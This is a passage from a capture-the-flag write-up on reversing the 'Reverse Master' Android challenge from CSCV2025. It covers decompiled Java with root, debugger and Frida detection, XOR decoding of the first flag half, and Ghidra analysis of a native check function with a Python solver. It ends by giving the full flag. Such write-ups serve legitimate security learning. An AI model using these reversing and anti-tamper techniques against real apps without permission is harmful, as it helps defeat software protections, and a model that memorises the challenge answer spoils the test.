InetSocketAddress(\u0026#34;127.0.0.1\u0026#34;, i2), 100); socket.close(); z2 = true; break; } catch (Exception unused3) { i2++; } } if (!z3 \u0026amp;\u0026amp; !z \u0026amp;\u0026amp; !z2) { Thread thread = new Thread(new RunnableC0154w(8, this)); thread.setDaemon(true); thread.start(); final TextInputLayout textInputLayout = (TextInputLayout) findViewById(R.id.flagInputLayout); final TextInputEditText textInputEditText = (TextInputEditText) findViewById(R.id.flagInput); Button button = (Button) findViewById(R.id.checkButton); Button button2 = (Button) findViewById(R.id.hintButton); button.setOnClickListener(new View.OnClickListener() { // from class: o.y3 /* JADX WARN: Removed duplicated region for block: B:4:0x001a */ @Override // android.view.View.OnClickListener /* Code decompiled incorrectly, please refer to instructions dump. To view partially-correct code enable \u0026#39;Show inconsistent code\u0026#39; option in preferences */ public final void onClick(android.view.View r13) { /* r12 = this; r13 = 16 r0 = 1 int r1 = com.ctf.challenge.MainActivity.b com.google.android.material.textfield.TextInputEditText r1 = r1 android.text.Editable r1 = r1.getText() java.lang.String r1 = java.lang.String.valueOf(r1) com.ctf.challenge.MainActivity r2 = r2 java.lang.String r3 = \u0026#34;CSCV2025{\u0026#34; boolean r3 = r1.startsWith(r3) r4 = 0 if (r3 != 0) goto L1c L1a: r13 = r4 goto L6e L1c: java.lang.String r3 = \u0026#34;}\u0026#34; boolean r3 = r1.endsWith(r3) if (r3 != 0) goto L25 goto L1a L25: int r3 = r1.length() int r3 = r3 - r0 r5 = 9 java.lang.String r1 = r1.substring(r5, r3) java.lang.String r3 = \u0026#34;substring(...)\u0026#34; o.F2.e(r1, r3) java.lang.String r5 = r1.substring(r4, r13) o.F2.e(r5, r3) byte[] r6 = new byte[r13] r6 = {x0090: FILL_ARRAY_DATA , data: [122, 86, 27, 22, 53, 35, 80, 77, 24, 98, 122, 7, 72, 21, 98, 114} // fill-array byte[] r7 = new byte[r13] r8 = r4 L44: if (r8 \u0026gt;= r13) goto L55 r9 = r6[r8] byte[] r10 = r2.a int r11 = r10.length int r11 = r8 % r11 r10 = r10[r11] r9 = r9 ^ r10 byte r9 = (byte) r9 r7[r8] = r9 int r8 = r8 + r0 goto L44 L55: java.lang.String r6 = new java.lang.String java.nio.charset.Charset r8 = o.X.a r6.\u0026lt;init\u0026gt;(r7, r8) boolean r5 = r5.equals(r6) if (r5 != 0) goto L63 goto L1a L63: java.lang.String r13 = r1.substring(r13) o.F2.e(r13, r3) boolean r13 = r2.checkSecondHalf(r13) L6e: com.google.android.material.textfield.TextInputLayout r1 = r3 if (r13 == 0) goto L80 java.lang.String r13 = \u0026#34;🎉 Correct! Flag is valid!\u0026#34; android.widget.Toast r13 = android.widget.Toast.makeText(r2, r13, r0) r13.show() r13 = 0 r1.setError(r13) return L80: java.lang.String r13 = \u0026#34;❌ Wrong flag! Try again!\u0026#34; android.widget.Toast r13 = android.widget.Toast.makeText(r2, r13, r4) r13.show() java.lang.String r13 = \u0026#34;Invalid flag\u0026#34; r1.setError(r13) return */ throw new UnsupportedOperationException(\u0026#34;Method not decompiled: o.ViewOnClickListenerC0170y3.onClick(android.view.View):void\u0026#34;); } }); button2.setOnClickListener(new F3(3, this)); return; } setContentView(R.layout.security_warning); TextView textView = (TextView) findViewById(R.id.countdownText); LinearLayout linearLayout = (LinearLayout) findViewById(R.id.issuesList); if (z3) { F2.c(linearLayout); h(linearLayout, \u0026#34;Debug Mode Detected\u0026#34;, \u0026#34;Application is running in debuggable mode\u0026#34;); } if (z) { F2.c(linearLayout); h(linearLayout, \u0026#34;Root Access Detected\u0026#34;, \u0026#34;Device has been rooted or jailbroken\u0026#34;); } if (z2) { F2.c(linearLayout); h(linearLayout, \u0026#34;Frida Framework Detected\u0026#34;, \u0026#34;Dynamic instrumentation tool is running\u0026#34;); } new CountDownTimerC0176z3(textView, this).start(); } public final native void startFridaMonitoring(); } You can find the first half of the flag with this XOR code from python:\nbyte[] encrypted = { 122, 86, 27, 22, 53, 35, 80, 77, 24, 98, 122, 7, 72, 21, 98, 114 }; byte[] key = {66, 51, 122, 33, 86}; for (int i = 0; i \u0026lt; 16; i++) { decrypted[i] = encrypted[i] ^ key[i % key.length]; } String expected = new String(decrypted, Charset.UTF_8); return input.equals(expected); The output is:\n8ea7cac794842440 To find out the second half of the flag, we\u0026rsquo;ll disassemble and analyze the native code to reverse the logic inside checkSecondHalf from libnative-lib.so Let use apktool command in terminal to extract libnative-lib.so from the apk file:\napktool d -f reverse-master.apk -o reverse-master_src A new folder named reverse-master_src will appear in the same path you use Terminal. Check that out and find libnative-lib.so in the lib folder Let open this file in ghidra and find the Java_com_ctf_challenge_MainActivity_checkSecondHalf function:\nbool Java_com_ctf_challenge_MainActivity_checkSecondHalf (long *param_1,undefined8 param_2,undefined8 param_3) { int iVar1; int iVar2; int iVar3; ulong uVar4; char *__s; size_t sVar5; uVar4 = FUN_00119ca0(); if ((uVar4 \u0026amp; 1) != 0) { __android_log_print(4,\u0026#34;Lib-Native\u0026#34;,\u0026#34;Debugger detected in native code!\u0026#34;); return false; } __s = (char *)(**(code **)(*param_1 + 0x548))(param_1,param_3,0); if (__s != (char *)0x0) { sVar5 = strlen(__s); iVar1 = rand(); iVar1 = iVar1 % 0x32 + 1; iVar2 = rand(); iVar2 = iVar2 % 0x32 + 1; if (iVar1 * iVar1 + iVar2 * iVar2 == (iVar2 + iVar1) * (iVar2 + iVar1) + iVar1 * iVar2 * -2 + 1) { FUN_0011ac60(__s); FUN_0011accc(); } iVar1 = rand(); iVar1 = iVar1 % 100; iVar2 = rand(); iVar2 = iVar2 % 100; if ((iVar2 + iVar1) * (iVar2 + iVar1) \u0026lt; iVar1 * iVar1 + iVar2 * iVar2) { iVar3 = 0; } else { iVar3 = FUN_0011ad68(__s,sVar5 \u0026amp; 0xffffffff); iVar1 = rand(); iVar1 = iVar1 % 0x32 + 1; iVar2 = rand(); iVar2 = iVar2 % 0x32 + 1; if (iVar1 * iVar1 + iVar2 * iVar2 == (iVar2 + iVar1) * (iVar2 + iVar1) + iVar1 * iVar2 * -2 + 1) { FUN_0011b5e8(__s); FUN_0011b658(); } } (**(code **)(*param_1 + 0x550))(param_1,param_3,__s); if (iVar3 != 0) { iVar1 = rand(); iVar1 = iVar1 % 100; iVar2 = rand(); iVar2 = iVar2 % 100; if (iVar1 * iVar1 + iVar2 * iVar2 \u0026lt;= (iVar2 + iVar1) * (iVar2 + iVar1)) { return true; } } iVar1 = rand(); iVar1 = iVar1 % 0x32 + 1; iVar2 = rand(); iVar2 = iVar2 % 0x32 + 1; return iVar1 * iVar1 + iVar2 * iVar2 == (iVar2 + iVar1) * (iVar2 + iVar1) + iVar1 * iVar2 * -2 + 1; } rand(); rand(); return false; } Let chatGPT analyze this: So let go to FUN_0011ad68 to see what inside this:\nundefined4 FUN_0011ad68(byte *param_1,int param_2) { byte bVar1; byte bVar2; byte bVar3; byte bVar4; byte bVar5; undefined1 auVar6 [16]; undefined8 uVar7; uint5 uVar8; int iVar9; int iVar10; byte *pbVar11; uint5 *puVar12; uint uVar13; byte bVar14; byte bVar15; byte bVar16; byte bVar17; byte bVar18; undefined4 local_90; pbVar11 = (byte *)calloc(0x10,1); uVar13 = 0x1a2b; bVar18 = 0; local_90 = 0; do { if (uVar13 \u0026lt; 0x7a8b) { if (uVar13 == 0x1a2b) { iVar9 = rand(); iVar9 = iVar9 % 100; iVar10 = rand(); iVar10 = iVar10 % 100; uVar13 = 0xbecf; if (iVar9 * iVar9 + iVar10 * iVar10 \u0026lt;= (iVar10 + iVar9) * (iVar10 + iVar9)) { uVar13 = 0x3c4d; } } else if (uVar13 == 0x3c4d) { if (param_2 != 0x10) goto LAB_0011b004; iVar9 = rand(); iVar9 = iVar9 % 0x32 + 1; iVar10 = rand(); iVar10 = iVar10 % 0x32 + 1; uVar13 = 0xbecf; if (iVar9 * iVar9 + iVar10 * iVar10 != (iVar10 + iVar9) * (iVar10 + iVar9) + iVar9 * iVar10 * -2 + 1) { uVar13 = 0x5e6f; } } else { if (uVar13 != 0x5e6f) goto LAB_0011b538; puVar12 = (uint5 *)calloc(5,1); if (puVar12 == (uint5 *)0x0) { bVar14 = 0; bVar18 = 0; bVar16 = 0; bVar17 = 0; bVar15 = 0; } else { bVar14 = 99; bVar15 = 0x7d; bVar17 = 0xe2; bVar16 = 0x14; bVar18 = 0xb8; *(undefined4 *)puVar12 = 0xb814e27d; *(byte *)((long)puVar12 + 4) = 99; } bVar1 = *(byte *)((long)puVar12 + 1); bVar2 = (byte)*puVar12; bVar3 = *(byte *)((long)puVar12 + 2); bVar4 = *(byte *)((long)puVar12 + 3); bVar5 = *(byte *)((long)puVar12 + 4); uVar8 = *puVar12; pbVar11[1] = (bVar17 ^ 0x6c) - 10 ^ bVar1; *pbVar11 = (bVar15 ^ 0x2f) - 7 ^ bVar2; pbVar11[2] = ((bVar16 | 1) ^ 0x95) - 0xd ^ bVar3 ^ 2; pbVar11[0xd] = (bVar18 ^ 8) - 0x2e ^ bVar4 ^ 0xd; pbVar11[4] = (bVar14 ^ 0x74) - 0x13 ^ bVar5 ^ 4; pbVar11[0xf] = (bVar15 ^ 7) - 0x34 ^ bVar2 ^ 0xf; pbVar11[0x10] = 0; pbVar11[3] = ((bVar18 | 2) ^ 0x21) - 0x10 ^ bVar4; pbVar11[0xe] = (bVar14 ^ 0x5a) - 0x31 ^ bVar5 ^ 0xe; auVar6._5_3_ = 0; auVar6._0_5_ = uVar8; auVar6[8] = bVar2; auVar6[9] = bVar1; auVar6[10] = bVar3; auVar6[0xb] = bVar4; auVar6[0xc] = bVar5; auVar6._13_3_ = 0; uVar7 = a64_TBL(ZEXT816(0),auVar6,0x201000403020100); bVar18 = ((bVar18 | 7) ^ 0x4d) - 0x1f ^ 8 ^ (byte)((ulong)uVar7 \u0026gt;\u0026gt; 0x18); *(ulong *)(pbVar11 + 5) = CONCAT17(((bVar16 | 0xb) ^ 0x53) - 0x2b ^ 0xc ^ (byte)((ulong)uVar7 \u0026gt;\u0026gt; 0x38), CONCAT16((bVar17 ^ 0xe2) - 0x28 ^ 0xb ^ (byte)((ulong)uVar7 \u0026gt;\u0026gt; 0x30), CONCAT15((bVar15 ^ 0x17) - 0x25 ^ 10 ^ (byte)((ulong)uVar7 \u0026gt;\u0026gt; 0x28) , CONCAT14(((bVar14 | 8) ^ 0x45) - 0x22 ^ 9 ^ (byte)((ulong)uVar7 \u0026gt;\u0026gt; 0x20), CONCAT13(bVar18,CONCAT12((bVar16 ^ 0x28) - 0x1c ^ 7 ^ (byte)((ulong)uVar7 \u0026gt;\u0026gt; 0x10), CONCAT11(((bVar17 | 5) ^ 0x47) - 0x19 ^ 6 ^ (byte)((ulong) uVar7 \u0026gt;\u0026gt; 8), (bVar15 ^ 0x4c) - 0x16 ^ 5 ^ (byte)uVar7))))))); iVar9 = rand(); iVar9 = iVar9 % 100; iVar10 = rand(); iVar10 = iVar10 % 100; uVar13 = 0xbecf; if (iVar9 * iVar9 + iVar10 * iVar10 \u0026lt;= (iVar10 + iVar9) * (iVar10 + iVar9)) { uVar13 = 0x7a8b; } } } else if (uVar13 \u0026lt; 0xbecf) { if (uVar13 == 0x7a8b) { if (((((((((((((((*pbVar11 == *param_1 \u0026amp;\u0026amp; pbVar11[1] == param_1[1]) \u0026amp;\u0026amp; pbVar11[2] == param_1[2]) \u0026amp;\u0026amp; pbVar11[3] == param_1[3]) \u0026amp;\u0026amp; pbVar11[4] == param_1[4]) \u0026amp;\u0026amp; pbVar11[5] == param_1[5]) \u0026amp;\u0026amp; pbVar11[6] == param_1[6]) \u0026amp;\u0026amp; pbVar11[7] == param_1[7]) \u0026amp;\u0026amp; bVar18 == param_1[8]) \u0026amp;\u0026amp; pbVar11[9] == param_1[9]) \u0026amp;\u0026amp; pbVar11[10] == param_1[10]) \u0026amp;\u0026amp; pbVar11[0xb] == param_1[0xb]) \u0026amp;\u0026amp; pbVar11[0xc] == param_1[0xc]) \u0026amp;\u0026amp; pbVar11[0xd] == param_1[0xd]) \u0026amp;\u0026amp; pbVar11[0xe] == param_1[0xe]) \u0026amp;\u0026amp; pbVar11[0xf] == param_1[0xf]) { iVar9 = rand(); iVar9 = iVar9 % 100; iVar10 = rand(); iVar10 = iVar10 % 100; if (iVar9 * iVar9 + iVar10 * iVar10 \u0026lt;= (iVar10 + iVar9) * (iVar10 + iVar9)) { uVar13 = 0x9cad; goto LAB_0011b008; } } LAB_0011b004: uVar13 = 0xbecf; } else { if (uVar13 != 0x9cad) goto LAB_0011b538; local_90 = 1; LAB_0011b0f4: uVar13 = 0xd1e2; } } else { if (uVar13 == 0xbecf) { local_90 = 0; goto LAB_0011b0f4; } if (uVar13 == 0xd1e2) { return local_90; } LAB_0011b538: iVar9 = rand(); iVar9 = iVar9 % 100; iVar10 = rand(); iVar10 = iVar10 % 100; if (iVar9 * iVar9 + iVar10 * iVar10 \u0026lt;= (iVar10 + iVar9) * (iVar10 + iVar9)) { uVar13 = 0xbecf; } } LAB_0011b008: rand(); } while( true ); } So i give this to chatGPT and i have a python code solve the second half like this:\n# solve_second_half.py def u8(x): return x \u0026amp; 0xFF def compute_second_half(): # puVar12 = 0xb8 14 e2 7d + 0x63 (little-endian 0xb814e27d then 0x63) b2 = 0x7d b1 = 0xe2 b3 = 0x14 b4 = 0xb8 b5 = 0x63 # duplicates in code b14 = 0x63 b15 = 0x7d b17 = 0xe2 b16 = 0x14 b18 = 0xb8 pb = [0]*16 pb[1] = u8(((b17 ^ 0x6C) - 10) ^ b1) pb[0] = u8(((b15 ^ 0x2F) - 7) ^ b2) pb[2] = u8((((b16 | 1) ^ 0x95) - 13) ^ b3 ^ 2) pb[13] = u8((((b18 ^ 8) - 46) ^ b4) ^ 13) pb[4] = u8((((b14 ^ 0x74) - 19) ^ b5) ^ 4) pb[15] = u8((((b15 ^ 7) - 52) ^ b2) ^ 15) pb[3] = u8((((b18 | 2) ^ 0x21) - 16) ^ b4) pb[14] = u8((((b14 ^ 0x5A) - 49) ^ b5) ^ 14) # Build auVar6 (first 5 bytes are [b2,b1,b3,b4,b5]) au = [0]*16 au[0],au[1],au[2],au[3],au[4] = b2,b1,b3,b4,b5 # a64_TBL(..., mask=0x0201000403020100) → select bytes [0,1,2,3,4,0,1,2] sel = [au[i] for i in (0,1,2,3,4,0,1,2)] pick = lambda sh: sel[(sh//8)] # update b18 and fill pb[5..12] b18 = u8(((b18 | 7) ^ 0x4D) - 0x1F ^ 8 ^ pick(0x18)) X1 = u8((b15 ^ 0x4C) - 0x16 ^ 5 ^ pick(0x00)) X2 = u8(((b17 | 5) ^ 0x47) - 0x19 ^ 6 ^ pick(0x08)) X3 = u8((b16 ^ 0x28) - 0x1C ^ 7 ^ pick(0x10)) X4 = u8(((b14 | 8) ^ 0x45) - 0x22 ^ 9 ^ pick(0x20)) X5 = u8((b15 ^ 0x17) - 0x25 ^ 10 ^ pick(0x28)) X6 = u8((b17 ^ 0xE2) - 0x28 ^ 11 ^ pick(0x30)) X7 = u8(((b16 | 0xB) ^ 0x53) - 0x2B ^ 12 ^ pick(0x38)) pb[5],pb[6],pb[7],pb[8],pb[9],pb[10],pb[11],pb[12] = X1,X2,X3,b18,X4,X5,X6,X7 return bytes(pb) if __name__ == \u0026#34;__main__\u0026#34;: second = compute_second_half() print(second.hex()) # 6fe3ccc3cf2197e4 print(second.decode()) # 6fe3ccc3cf2197e4 The output is:\n6fe3ccc3cf2197e4 So the flag is CSCV2025{8ea7cac7948424406fe3ccc3cf2197e4} Thanks for watching this post😘!\n","externalUrl":null,"permalink":"/re/1761228753586-re/","section":"Res","summary":"","title":"Write-up for Reverse Master CSCV2025 ","type":"re"}]